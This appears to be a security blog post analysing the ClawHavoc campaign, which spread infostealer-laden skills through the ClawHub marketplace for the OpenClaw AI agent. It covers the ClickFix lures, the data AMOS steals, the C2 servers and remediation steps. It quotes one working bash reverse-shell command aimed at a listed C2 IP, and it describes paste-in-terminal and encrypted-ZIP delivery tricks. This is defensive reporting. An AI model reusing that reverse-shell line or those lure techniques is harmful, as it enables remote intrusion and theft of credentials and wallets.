@@ -1,0 +1,273 @@
+---
+title: 'How 341 Malicious OpenClaw Skills Spread'
+date: '2026-02-19T12:00:23'
+language: 'en'
+translationOf: 'openclaw-341-malicious-skills'
+tags: ['openclaw', 'supply-chain-attack', 'clawhub', 'malware', 'ai-agent', 'security']
+draft: false
+images: ['/static/images/openclaw-341-malicious-skills/og-image.jpg']
+summary: 'Koi Security discovered 341 malicious skills on the ClawHub marketplace. 335 originated from a single campaign called ClawHavoc, distributing the AMOS infostealer to exfiltrate cryptocurrency wallets and cloud credentials.'
+---
+
+## 341 Out of 2,857 Were Malicious
+
+![AI Agent Security Threats — The New Battlefield of Supply Chain Attacks](/static/images/openclaw-341-malicious-skills/og-image.jpg)
+
+On February 1, 2026, Koi Security's research team audited the entire ClawHub marketplace. **341 out of 2,857 skills** were identified as malicious. That's roughly 12%. More than one in ten skills contained malicious code.
+
+What's more shocking is that **335 of these 341 came from a single campaign**. Koi Security named this attack **ClawHavoc**. It was organized, systematic, and large-scale.
+
+By February 16, ClawHub had expanded to **over 10,700 skills**. Malicious skills also **more than doubled to 824**. The marketplace's growth rate outpaced security validation.
+
+This article traces how the ClawHavoc campaign spread 341 malicious skills, what paths infected victims, and what was stolen.
+
+---
+
+## ClawHavoc: Anatomy of a Single Campaign
+
+ClawHavoc was not a random attack. It was a **precisely targeted supply chain attack**. The attackers analyzed what skills OpenClaw users were looking for and exploited that demand.
+
+Looking at the distribution of the 335 malicious skills by category reveals the strategy.
+
+| Category              | Count | Target               |
+| --------------------- | ----- | -------------------- |
+| YouTube summary tools | 57    | Mass reach           |
+| Polymarket bots       | 34    | Prediction traders   |
+| Solana wallet utils   | 33    | Crypto users         |
+| Phantom wallet tools  | 28    | Solana ecosystem     |
+| Auto updaters         | 28    | Legitimacy disguise  |
+| ClawHub typosquatting | 29    | Dependency confusion |
+| Google Workspace      | 17    | Productivity access  |
+| Ethereum gas tracker  | 15    | DeFi users           |
+| Yahoo Finance         | 51    | Finance/social       |
+| Others                | 43    | Various needs        |
+
+The pattern is clear. **Cryptocurrency users were the primary target**. 76 skills related to Solana, Phantom, and Ethereum. Crypto wallets contain assets as good as cash. Once stolen, they can be immediately liquidated.
+
+The second target was **mainstream tool users**. Features everyone needs, like YouTube summarizers and Google Workspace integration, were used as bait. A wide net to catch as many victims as possible.
+
+29 **typosquatting skills** also stand out. Names like clawhubb, cllawhub, clawhub-official exploited user typos. The same dependency confusion attacks that have plagued npm and PyPI for years.
+
+---
+
+## Infection Chain: ClickFix Social Engineering
+
+![Malware Infection Path — Evolution of Social Engineering Techniques](/static/images/openclaw-341-malicious-skills/infection-chain.jpg)
+
+ClawHavoc's infection chain is not technically sophisticated. Instead, it relies on **social engineering**. Making users execute malicious code themselves.
+
+The skill documentation included a "Required Prerequisites" section. It instructed that certain software must be installed before using the skill. This was the trap.
+
+**The macOS user path** went like this:
+
+1. Skill documentation provides a glot.io link
+2. The link contains a Base64-encoded shell command
+3. Instructions say "paste into terminal and execute"
+4. If the user complies, a dropper downloads from a remote server
+5. The dropper installs **Atomic macOS Stealer (AMOS)**
+
+**The Windows user path** was slightly different:
+
+1. Instructions to download a password-protected ZIP from GitHub
+2. Password provided with plausible names like "AuthTool"
+3. Unzipping executes a VMProtect-packed infostealer
+
+Why a password-protected ZIP? **Antivirus evasion**. Encrypted archives prevent scanners from inspecting contents. Users must manually enter the password to extract, and that's when malware executes.
+
+This technique is called **ClickFix**. No complex exploits required—just user trust and behavior. Technically simple but effective. Since users executed it themselves, even antivirus can't easily block it.
+
+---
+
+## AMOS: A Complete Theft Tool in 521KB
+
+The core payload distributed by ClawHavoc was **Atomic macOS Stealer**, abbreviated as AMOS. Commercial malware sold on Telegram for **$500–1,000 monthly**. A Malware-as-a-Service (MaaS) model.
+
+AMOS binary's technical characteristics show the developer's skill:
+
+- **521KB universal Mach-O binary** (supports both x86_64 and arm64)
+- Ad-hoc signed (no Apple certificate)
+- Random identifier: `jhzhhfomng`
+- **Fully encrypted strings** (static analysis evasion)
+
+Fully encrypted strings mean security researchers opening the binary can't immediately tell what it does. A technique to hinder reverse engineering.
+
+The list of data AMOS exfiltrates is extensive:
+
+**Browser data**: Saved passwords, cookies, autofill data, search history from Chrome, Safari, Firefox, Edge
+
+**Cryptocurrency wallets**: **Over 60 browser extensions** and local wallet files including Exodus, Binance, Electrum, Atomic, Coinbase, MetaMask
+
+**System credentials**: Entire macOS Keychain, SSH private keys, shell history (.bash_history, .zsh_history)
+
+**Cloud services**: AWS, Google Cloud, Azure credentials, developer .env files
+
+**Messaging**: Telegram session data and chat history
+
+**Personal files**: Files from Desktop and Documents folders
+
+The core function `copyDirectoryWithExclusions()` selectively copies vast file hierarchies. It excludes unnecessary system files and efficiently collects only valuable data.
+
+---
+
+## C2 Infrastructure and Reverse Shell Backdoor
+
+![C2 Server Infrastructure — The Attacker's Command and Control Network](/static/images/openclaw-341-malicious-skills/c2-infrastructure.jpg)
+
+The C2 (Command & Control) infrastructure tracked by Koi Security was distributed across multiple servers.
+
+| IP Address    | Role                 |
+| ------------- | -------------------- |
+| 91.92.242.30  | Main payload server  |
+| 95.92.242.30  | Secondary payload    |
+| 96.92.242.30  | Secondary payload    |
+| 202.161.50.59 | Data collection      |
+| 54.91.154.110 | Reverse shell server |
+
+**91.92.242.30** is the core. All 341 malicious skills downloaded payloads from this server. Sharing a single C2 infrastructure is strong evidence this was an organized single campaign.
+
+More dangerous is the **reverse shell backdoor**. Separate from AMOS's automatic data theft, some skills installed reverse shells.
+
+```bash
+/usr/bin/nohup /bin/bash -c '/bin/bash -i >/dev/tcp/54.91.154.110/13338 0>&1 &'
+```
+
+When this code executes, **attackers can directly access the victim's system**. Interactive shell access. If AMOS's automatic theft is stage 1, the reverse shell is stage 2. Deeper penetration, more information collection, and if needed, installing additional malware.
+
+This reverse shell code was found in the `better-polymarket` and `polymarket-all-in-one` skills. Amid seemingly normal code, there was a **hidden C2 connection**.
+
+---
+
+## Anomalies: Six Independent Attackers
+
+Of the 341 malicious skills, 335 belonged to the ClawHavoc campaign. The remaining **6 were separate attacks**. Independent threat actors targeting the same ecosystem.
+
+**Hidden Backdoor (2)**: `better-polymarket`, `polymarket-all-in-one`. C2 connections hidden within functional code. Unlike ClawHavoc, these **lay dormant** without immediate malicious behavior.
+
+**AuthTool campaign (3)**: Distributed password-protected ZIP files. Similar technique to ClawHavoc but used different C2 infrastructure.
+
+**Direct credential theft (1)**: A skill named `rankaj`. No malware installation—directly read and transmitted environment files like .env. Simple but effective.
+
+The implication is clear. ClawHub became a **playground for multiple threat actors**. Even if one campaign is cleaned up, other attackers will continue with the same tactics.
+
+---
+
+## Timeline: A Bomb in 5 Days
+
+The ClawHavoc campaign timeline shows the attack's speed.
+
+**January 27**: First malicious skills uploaded. At least 14 went up on day one.
+
+**January 27–29**: Attackers rapidly added skills. Crypto-related skills concentrated during this period.
+
+**January 29–31**: Expanded to mainstream categories like YouTube tools and Google Workspace integration.
+
+**January 31**: Massive upload. Over 100 malicious skills added in a single day.
+
+**February 1**: Koi Security began full ClawHub audit. **341 of 2,857 skills confirmed malicious**.
+
+**February 2**: ClawHavoc campaign publicly announced. Media coverage began.
+
+**February 3**: OpenClaw introduced user reporting. Skills automatically hidden after 3 reports.
+
+**February 16**: ClawHub expanded to 10,700 skills. Malicious skills also **increased to 824**.
+
+Five days. From first upload to 341 malicious skills spreading—just five days. And as the marketplace grew, malicious skills grew with it. A pace security teams can't match.
+
+---
+
+## Why ClawHub: The Perfect Supply Chain Target
+
+Why ClawHub was attractive to attackers is clear.
+
+**First, no moderation**. Anyone could upload skills. No verification process—immediately listed on the marketplace. From an attacker's perspective, no barriers.
+
+**Second, trust transfer**. OpenClaw is one of the fastest-growing GitHub projects ever. Over 140,000 stars. This trust transferred to ClawHub skills. The psychology of "it's the official OpenClaw marketplace, so it must be safe."
+
+**Third, scope of permissions**. OpenClaw agents access email, WhatsApp, Telegram, calendars, file systems. If a skill is malicious, all these permissions go to the attacker. A much broader attack surface than typical malicious apps.
+
+**Fourth, user demographics**. OpenClaw early adopters are tech-savvy developers and cryptocurrency investors. People with assets worth stealing.
+
+This is a pattern repeated in npm, PyPI, VS Code extensions. Developer ecosystem marketplaces are regular targets for supply chain attacks. The AI agent ecosystem was no exception.
+
+---
+
+## OpenClaw's Response: Too Little, Too Late
+
+OpenClaw's response was inadequate.
+
+They introduced a **user reporting feature**. Skills automatically hidden after 3 reports. But this is reactive. Reports only come after someone's already been harmed.
+
+They announced **VirusTotal integration**. Uploaded skills are SHA-256 hashed and analyzed by VirusTotal's Code Insight AI. But new malware may not be in VirusTotal's database. Detection rate is limited.
+
+They said they'd **rescan daily**. Already uploaded skills are re-inspected every day. But looking at the 824 malicious skills, effectiveness is questionable.
+
+What's missing?
+
+**No pre-validation process**. No code review before skills are uploaded. The same state as npm's early days.
+
+**No sandboxed execution environment**. No feature to first test what network connections a skill makes or what files it accesses in an isolated environment.
+
+**Principle of least privilege** not applied. A gap exists between the permissions a skill needs and the permissions actually granted.
+
+Laurie Voss, Director of Developer Relations at Arize, described OpenClaw as a **"security disaster."** Not an exaggeration.
+
+---
+
+## What Victims Can Do
+
+Already installed skills from ClawHub?
+
+**Step 1: Run Clawdex scanner**. A free tool from Koi Security. Checks if installed skills are on the known malicious list.
+
+**Step 2: Check network connections**. Verify outbound connections to known C2 IPs like 91.92.242.30 and 54.91.154.110. Use firewall logs or tools like Little Snitch.
+
+**Step 3: Rotate credentials**. Change all browser-saved passwords, cryptocurrency wallets, and cloud service keys. Especially API keys in .env files—immediately revoke and reissue.
+
+**Step 4: Review 2FA**. Recovery codes for 2FA-enabled accounts may have been exfiltrated. Regenerate recovery codes if possible.
+
+**Step 5: Move to isolated environment**. If continuing to use OpenClaw, run it in a virtual machine or Docker container. Isolate from the host system.
+
+The safest approach? **Whitelist only trusted skills** and be extremely cautious when installing new ones.
+
+---
+
+## Structural Problems in the AI Agent Ecosystem
+
+ClawHavoc isn't just OpenClaw's problem. **The entire AI agent ecosystem** carries the same risk.
+
+AI agents' value comes from **autonomy**. They complete tasks without user intervention. But autonomy requires permissions. File access, network communication, API calls. The greater the permissions, the more useful—and the more dangerous.
+
+Plugin/skill ecosystems extend this autonomy. The community adds functionality. An open-source advantage. But if anyone can contribute, so can malicious actors.
+
+Centralized marketplaces become trust hubs. Users don't verify individual skills. They trust the marketplace. When this trust is exploited, damage amplifies.
+
+npm, PyPI, Chrome Web Store, VS Code Marketplace. Every developer ecosystem has faced the same problem. The AI agent ecosystem is no exception. Actually, because the scope of permissions is broader, **the risk is greater**.
+
+---
+
+## Lesson: Speed vs. Security Tradeoff
+
+OpenClaw grew faster than any project in GitHub history. 34,168 stars in 48 hours. 710 stars per hour at peak. 100,000 stars in 2 days.
+
+ClawHub also grew rapidly. From 2,857 skills on February 1 to 10,700 on February 16. Quadrupled in 2 weeks.
+
+Security couldn't keep pace with growth. That 341 malicious skills spread in 5 days wasn't coincidence. It happened because there was no verification process.
+
+This is a tradeoff. Introduce strict verification and growth slows. Developers leave. The ecosystem shrinks. Leave it open without verification and it grows fast, but attackers penetrate just as quickly.
+
+OpenClaw chose growth. Users are paying the price.
+
+More AI agent marketplaces will emerge. Their choices will determine the ecosystem's security level. ClawHavoc shows what happens when the wrong choice is made.
+
+---
+
+**Sources:**
+
+- [OpenClaw Marketplace Flooded with 341 Malicious Skills — SecureBlink](https://www.secureblink.com/cyber-security-news/open-claw-marketplace-flooded-with-341-malicious-skills-in-major-supply-chain-attack)
+- [ClawHavoc: 341 Malicious Clawed Skills Found — Koi Security](https://www.koi.ai/blog/clawhavoc-341-malicious-clawedbot-skills-found-by-the-bot-they-were-targeting)
+- [Hundreds of Malicious Skills Found in OpenClaw's ClawHub — eSecurity Planet](https://www.esecurityplanet.com/threats/hundreds-of-malicious-skills-found-in-openclaws-clawhub/)
+- [OpenClaw Security Crisis — Security Boulevard](https://securityboulevard.com/2026/02/openclaw-open-source-ai-agent-application-attack-surface-and-security-risk-system-analysis/)
+- [OpenClaw ClawHub Under Attack: 341 Malicious Plugins — Coinpedia](https://coinpedia.org/news/openclaw-clawhub-under-attack-341-malicious-plugins-expose-supply-chain-risks/)
+- [ClawHavoc Poisoned ClawHub with 1,184 Malicious Skills — GBHackers](https://gbhackers.com/clawhavoc-infects-openclaws-clawhub/)
+- [OpenClaw is a Security Nightmare — Barrack.ai](https://blog.barrack.ai/openclaw-security-vulnerabilities-2026/)
+- [Image Source — Unsplash](https://unsplash.com)
